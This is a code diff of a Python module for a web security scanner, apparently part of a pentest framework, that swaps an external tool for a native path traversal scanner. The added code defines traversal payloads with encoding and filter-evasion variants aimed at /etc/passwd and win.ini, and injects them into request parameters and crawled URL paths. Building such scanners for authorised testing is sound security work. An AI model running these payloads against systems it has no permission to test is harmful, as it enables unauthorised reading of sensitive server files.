@@ -1,126 +1,169 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""Path traversal scanning with the external Vailyn tool."""
+"""Native path traversal scanner -- URL path and request parameters, no external tools."""
 
 from __future__ import annotations
 
-import os
-import re
+from concurrent.futures import ThreadPoolExecutor
+from urllib.parse import urljoin, urlsplit, urlunsplit
 
 import core.variables as variables
+from core.methods import fileinj, inject, webinj
 from core.methods import modkit as kit
 from core.methods.print import pvln
 
-info = ("Path traversal scanning with Vailyn (https://github.com/VainlyStrain/Vailyn, an optional "
-        "external tool; see docs/install.md). Supports query, path, cookie, POST (plain/JSON) and "
-        "crawl-all attack vectors, cookies, a target file and depth. Vailyn's install directory is read "
-        "from core/doc/vailyn. For a built-in scanner without external tools use pathtrav_legacy "
-        "(URL path) or lfi (parameters).")
-searchinfo = "Advanced Path Traversal Scanning"
+info = ("Finds path traversal in the URL path and in request parameters -- no external tools. "
+        "Directory traversal sequences and their encoded / filter-evasion variants (../, ..%2f, "
+        "%2e%2e/, double encoding, ....//, ..;/, ..%5c, overlong UTF-8) are injected into every "
+        "parameter (PARAM, or all parameters found by crawling) and appended to the target "
+        "directories (DIRECTORY, or the target plus crawled directories). A read is confirmed only "
+        "when the /etc/passwd or win.ini content signature is in the response, not in the baseline, "
+        "and not in a control request for a missing file. The URL-path vector crawls for directories "
+        "only when PARAM is empty. Use lfi for absolute-path reads and php:// wrappers.")
+searchinfo = "Path Traversal Scanner"
+
+LEVELS = 10
+# (segment, separator for the file path, files) -- the segment is repeated LEVELS times
+VARIANTS = (
+    ("../", "/", ("passwd", "win.ini")),
+    ("..%2f", "%2f", ("passwd", "win.ini")),
+    ("%2e%2e/", "/", ("passwd",)),
+    ("%2e%2e%2f", "%2f", ("passwd",)),
+    ("..%252f", "%252f", ("passwd",)),
+    ("%252e%252e%252f", "%252f", ("passwd",)),
+    ("....//", "/", ("passwd",)),
+    ("..;/", "/", ("passwd",)),
+    ("%c0%ae%c0%ae/", "/", ("passwd",)),
+    ("..%c0%af", "%c0%af", ("passwd",)),
+    ("..\\", "\\", ("win.ini",)),
+    ("..%5c", "%5c", ("win.ini", "passwd")),
+)
+FILES = {"passwd": ("etc", "passwd"), "win.ini": ("windows", "win.ini")}
+
+CONFIRMED = "Path traversal (confirmed)"
+
 properties = {
-    "DIRECTORY": ["Sensitive directory appended to the target, e.g. /sensitive (empty: none)", ""],
-    "ATTACK": ["Attack vector: 1 query, 2 path, 3 cookie, 4 POST plain, 5 POST JSON, A crawl-all (default A)", ""],
-    "COOKIE": ["Authentication cookie in Cookie-header format, without 'Cookie:' (empty: none)", ""],
-    "PARAM": ["Query parameter for ATTACK 1", ""],
-    "POST": ["POST data for ATTACK 4/5 (mark the injection point with INJECT)", ""],
-    "FILE": ["File to look for (default /etc/passwd)", ""],
-    "DEPTH": ["Traversal depth (default 8)", ""],
-    "TIMEOUT": ["Request timeout in seconds passed to Vailyn (empty: Vailyn's default)", ""],
-    "PRECISE": ["Use exactly DEPTH instead of 1..DEPTH (y/n, default n)", ""],
-    "MAXTIME": ["Seconds before Vailyn is stopped (default 3600)", ""],
+    **inject.OPTIONS,
+    "DIRECTORY": ["Directory for the URL-path vector, e.g. /static/ or a full URL "
+                  "(empty: target + crawled directories)", ""],
+    "MAXDIRS": ["Maximum directories tested in the URL-path vector (default 15)", ""],
+    **kit.AUTH_OPTIONS,
 }
 
-VECTORS = ("1", "2", "3", "4", "5", "A")
-ANSI = re.compile(r"\x1b\[[0-9;?]*[A-Za-z]")
+
+def payloads() -> list[tuple[str, str]]:
+    """(traversal payload, signature key) pairs."""
+    out = []
+    for seg, sep, files in VARIANTS:
+        for key in files:
+            out.append((seg * LEVELS + sep.join(FILES[key]), key))
+    return out
 
 
-def executable() -> str:
-    """Path of the Vailyn script, '' (after saying why) when not installed."""
-    vdir = (variables.vailyndir or "").strip()
-    if not vdir:
-        kit.bad("Vailyn's install directory is not set (core/doc/vailyn); see docs/install.md, "
-                "or use pathtrav_legacy / lfi instead.")
-        return ""
-    path = os.path.join(os.path.abspath(os.path.expanduser(vdir)), "Vailyn")
-    if not os.path.isfile(path):
-        kit.bad(f"Vailyn not found at {path}; fix core/doc/vailyn or use pathtrav_legacy / lfi instead.")
-        return ""
-    return path
+# --------------------------------------------------------------------------
+# parameter vector
+# --------------------------------------------------------------------------
+
+def check_param(point: inject.Point, s, items: list[tuple[str, str]]):
+    base = fileinj.body(point.send(s, point.original))
+    base2 = fileinj.body(point.send(s, inject.marker()))
+    baseline = base + "\n" + base2  # nothing shown for a harmless value counts
+    for payload, key in items:
+        ev = fileinj.file_evidence(fileinj.body(fileinj.send(point, s, payload)), baseline, key)
+        if not ev:
+            continue
+        ctl = fileinj.control_payload(payload, key)
+        if ctl and fileinj.file_evidence(fileinj.body(fileinj.send(point, s, ctl)), baseline, key):
+            continue  # the "file content" shows up for a missing file too
+        yield inject.Finding(point, payload, f"{fileinj.file_label(key)} content: {ev}", CONFIRMED)
+        return
 
 
-def build(web, script: str) -> list[str] | None:
-    """Vailyn argv from the module options, None when an option is invalid."""
-    victim = kit.url(web)
-    directory = kit.option(properties, "DIRECTORY", "Directory to attack, e.g. /sensitive (enter for none)", "")
-    if directory:
-        victim += "/" + directory.strip().lstrip("/")
+# --------------------------------------------------------------------------
+# URL-path vector
+# --------------------------------------------------------------------------
 
-    attack = kit.option(properties, "ATTACK", "Attack vector (1 query, 2 path, 3 cookie, 4 POST, 5 JSON, A all)",
-                        "A").strip().upper()
-    if attack not in VECTORS:
-        kit.bad(f"Invalid ATTACK '{attack}': use one of {', '.join(VECTORS)}.")
-        return None
-    argv = [script, "--victim", victim, "--attack", attack]
+def _directory(url: str) -> str:
+    parts = urlsplit(url)
+    path = parts.path or "/"
+    path = path if path.endswith("/") else path.rsplit("/", 1)[0] + "/"
+    return urlunsplit((parts.scheme, parts.netloc, path, "", ""))
 
-    cookie = kit.option(properties, "COOKIE", "Authentication cookie (enter for none)", "")
-    if cookie:
-        argv += ["--cookie", cookie]
-    if attack == "1":
-        param = kit.option(properties, "PARAM", "Query parameter to attack", "")
-        if not param:
-            kit.bad("ATTACK 1 needs PARAM (the query parameter).")
-            return None
-        argv += ["--param", param]
-    elif attack in ("4", "5"):
-        post = kit.option(properties, "POST", "POST data (mark the injection point with INJECT)", "")
-        if "INJECT" not in post:
-            kit.bad("ATTACK 4/5 needs POST data with an INJECT marker.")
-            return None
-        argv += ["--param", post]
 
-    argv += ["--check", kit.option(properties, "FILE", "File to look for", "/etc/passwd") or "/etc/passwd"]
-    depth = max(1, kit.integer(properties, "DEPTH", "Traversal depth", 8))
-    argv += ["--depths", str(depth), "1", "1", "--nosploit", "--notmain"]
-    if kit.flag(properties, "PRECISE", "Use exactly DEPTH", False):
-        argv.append("--precise")
-    timeout = kit.option(properties, "TIMEOUT", "Request timeout in seconds (enter for default)", "")
-    if timeout:
-        try:
-            float(timeout)
-            argv += ["--timeout", timeout.strip()]
-        except ValueError:
-            kit.warn(f"Invalid TIMEOUT '{timeout}', using Vailyn's default.")
-    if variables.tor:
-        argv.append("--tor")
-    if kit.is_root() and (variables.username or "").strip():
-        argv = ["sudo", "-u", variables.username.strip(), *argv]  # drop root, as before
-    return argv
+def directories(web, crawl: bool) -> list[str]:
+    base = kit.url(web) + "/"
+    raw = kit.option(properties, "DIRECTORY", "Directory for the URL-path vector, e.g. /static/ (enter to crawl)", "")
+    limit = max(1, kit.integer(properties, "MAXDIRS", "Maximum directories tested", 15))
+    if raw:
+        url = raw if "://" in raw else urljoin(base, raw)
+        return [url if url.endswith("/") else url + "/"]
+    target = kit.url(web)
+    dirs = [_directory(target + ("/" if urlsplit(target).path in ("", "/") else ""))]
+    if crawl:
+        depth = max(0, kit.integer(properties, "DEPTH", "Crawl depth for directory discovery", 1))
+        if depth:
+            from core.methods import crawler  # late import: pulls in bs4/lxml and Katana
+            res = crawler.crawl(web, depth, max_pages=60, headers=kit.request_headers(properties))
+            if res.error:
+                kit.warn(f"{res.error} Testing the target directory only (or set DIRECTORY).")
+            dirs += [_directory(u) for u in sorted(res.internal | set(res.pages) | res.assets)]
+    dirs = list(dict.fromkeys(dirs))
+    if len(dirs) > limit:
+        kit.warn(f"{len(dirs)} directories found; testing the first {limit} (raise MAXDIRS).")
+    return dirs[:limit]
 
+
+def check_path(s, base: str, items: list[tuple[str, str]]):
+    baseline = fileinj.body(fileinj.raw_get(s, base)) + fileinj.body(fileinj.raw_get(s, base + "tid404.txt"))
+    for payload, key in items:
+        url = base + payload
+        ev = fileinj.file_evidence(fileinj.body(fileinj.raw_get(s, url)), baseline, key)
+        if not ev:
+            continue
+        ctl = fileinj.control_payload(payload, key)
+        if ctl and fileinj.file_evidence(fileinj.body(fileinj.raw_get(s, base + ctl)), baseline, key):
+            continue
+        return url, key, ev
+    return None
+
+
+# --------------------------------------------------------------------------
 
 def pathtrav(web):
     pvln("path traversal")
-    script = executable()
-    if not script:
-        return None
-    argv = build(web, script)
-    if argv is None:
-        return None
-    maxtime = max(30, kit.integer(properties, "MAXTIME", "Seconds before Vailyn is stopped", 3600))
-    kit.info("Running Vailyn; output is shown when it finishes.")
-    proc = kit.run_tool(argv, timeout=maxtime, cwd=os.path.dirname(script))
-    if proc is None:
-        kit.warn("Raise MAXTIME or lower DEPTH if Vailyn timed out.")
-        return None
-    out = ANSI.sub("", proc.stdout or "").strip()
-    if out:
-        print(out)
-    if proc.returncode != 0:
-        err = ANSI.sub("", proc.stderr or "").strip().splitlines()
-        kit.bad(f"Vailyn exited with status {proc.returncode}: {err[-1] if err else 'no error output'}")
-        kit.warn("Try upgrading Vailyn; report persistent errors at https://github.com/VainlyStrain/Vailyn")
     rec = kit.Recorder(web, kit.CRITICAL, "pathtrav")
-    rec("\n".join(out.splitlines()[-300:]) if out else "Vailyn finished without output.")
-    return proc
+    items = payloads()
+    s = webinj.session(properties, timeout=12)
+    param_set = bool(str(properties.get("PARAM", ["", ""])[1]).strip())
+    lines = []
+
+    # ---- parameter vector ----
+    points = inject.discover(web, properties)
+    if points:
+        kit.info(f"Testing {len(points)} parameter(s) with {len(items)} traversal payloads...")
+        for f in inject.scan(points, lambda p: check_param(p, s, items)):
+            kit.bullet(f.evidence)
+            lines.append(f"{CONFIRMED}: {f.point} <- {f.payload} -- {f.evidence}")
+
+    # ---- URL-path vector (crawl only when no explicit PARAM) ----
+    dirs = directories(web, crawl=not param_set)
+    kit.info(f"Testing {len(dirs)} director{'y' if len(dirs) == 1 else 'ies'} in the URL path "
+             f"with {len(items)} payloads...")
+    with ThreadPoolExecutor(max_workers=max(1, min(variables.processes, len(dirs), 16))) as pool:
+        for r in pool.map(lambda d: check_path(s, d, items), dirs):
+            if not r:
+                continue
+            url, key, ev = r
+            kit.found(CONFIRMED, url)
+            kit.bullet(f"{fileinj.file_label(key)} content: {ev}")
+            lines.append(f"{CONFIRMED}: {url} -- {fileinj.file_label(key)} content: {ev}")
+
+    if not lines:
+        kit.bad("No path traversal found.")
+        rec("No path traversal found.")
+        return []
+    rec(lines)
+    return lines
 
 
 def attack(web):
